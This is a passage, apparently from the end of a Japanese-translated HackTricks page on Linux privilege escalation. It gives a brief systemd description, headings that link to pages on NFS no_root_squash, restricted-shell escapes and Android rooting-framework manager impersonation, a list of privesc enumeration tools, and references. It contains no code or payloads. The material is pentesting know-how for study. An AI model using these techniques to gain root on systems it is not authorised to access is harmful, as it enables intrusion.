**systemd** はより現代的な初期化およびサービスマネージャとして登場し、on-demand daemon starting、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ用に `/usr/lib/systemd/`、管理者の変更用に `/etc/systemd/system/` に整理されており、システム管理を簡素化します。

## その他のトリック

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般に syscall をフックして privileged kernel functionality を userspace の manager に公開します。manager 認証が弱い（例: FD-order に基づく署名チェックや脆弱なパスワード方式）場合、ローカルアプリが manager を偽装して、すでに root 化されたデバイス上で root にエスカレートすることが可能になります。詳細とエクスプロイトについては以下を参照してください:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
